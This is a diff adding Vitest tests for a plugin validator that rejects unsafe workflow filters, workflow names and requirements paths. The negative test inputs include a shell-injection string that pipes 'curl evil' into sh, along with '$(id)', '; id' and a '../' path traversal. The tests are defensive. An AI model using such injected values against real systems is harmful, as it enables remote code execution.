@@ -5,7 +5,7 @@ import { describe, expect, test } from 'vitest';
 import { plugin as fixturePlugin } from '../../testing/fixture-plugin-agent/plugin';
 import { type AgentPlugin, type HostedArtifact, PluginRegistry } from '../contract';
 import { AGENT_PLUGINS } from '../generated/plugins';
-import { pluginViolationsOf, type PluginCheckEntry, type PluginCheckSources } from './plugins';
+import { pluginViolationsOf, pluginWorkflowViolationsOf, type PluginCheckEntry, type PluginCheckSources } from './plugins';
 
 const REPOSITORY_ROOT = fileURLToPath(new URL('../../../../', import.meta.url));
 const APPLICATIONS_FOLDER = 'apps';
@@ -189,5 +189,56 @@ describe('pluginViolationsOf', () => {
       `/pkg/ serves stray.whl but no plugin hosts it`,
       `no /pkg/ route serves ${REQUIREMENTS_FILENAME}`,
     ]);
+  });
+});
+
+describe('pluginWorkflowViolationsOf', () => {
+  const entryWith = (workflow: Partial<AgentPlugin['workflow']>): PluginCheckEntry => ({
+    id: FIXTURE_ID,
+    plugin: { ...fixturePlugin, workflow: { ...fixturePlugin.workflow, ...workflow } },
+  });
+
+  test('accepts the workflow of the real registry', () => {
+    const entries = Object.entries(AGENT_PLUGINS).map(([id, plugin]) => ({ id, plugin }));
+    expect(pluginWorkflowViolationsOf({ entries })).toEqual([]);
+  });
+
+  test.each(['x" ; curl evil|sh #', 'a b', '$(id)', 'x\ny', ''])('refuses the filter %j', (filter) => {
+    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ filter })] })).toEqual([
+      `${FIXTURE_ID}: the workflow filter must match ^[@\\w/.-]+$`,
+    ]);
+  });
+
+  test.each(['x; id', '@scoped', 'a b', ''])('refuses the name %j', (name) => {
+    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ name })] })).toEqual([
+      `${FIXTURE_ID}: the workflow name must match ^[\\w/.-]+$`,
+    ]);
+  });
+
+  test.each(['x"; id', '../elsewhere/requirements-dev.txt', 'other/requirements-dev.txt'])(
+    'refuses the requirements path %j',
+    (pythonRequirements) => {
+      expect(pluginWorkflowViolationsOf({ entries: [entryWith({ pythonRequirements })] })).toHaveLength(1);
+    },
+  );
+
+  test('accepts a requirements path inside the package folder', () => {
+    const pythonRequirements = `${fixturePlugin.packageFolder}/requirements-dev.txt`;
+    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ pythonRequirements })] })).toEqual([]);
+  });
+});
+
+describe('pluginViolationsOf for a self-hosted wheel', () => {
+  test('refuses a plugin whose artifacts are all hosted separately from the install command', () => {
+    const { plugin, files } = wheelAndRequirements({ requirementsText: 'x' });
+    const flagless = {
+      ...plugin,
+      hostedArtifacts: plugin.hostedArtifacts.map((artifact) => ({ ...artifact, embeddedInInstallCommand: false })),
+    };
+    const violations = syntheticViolations({
+      plugin: { ...flagless, registry: PluginRegistry.SelfHostedWheel },
+      sources: { readFile: memoryFiles({ files }), servedFilenames: flagless.hostedArtifacts.map((artifact) => artifact.filename) },
+    });
+    expect(violations).toContain('synthetic: exactly one hosted artifact must be embedded in the install command');
   });
 });
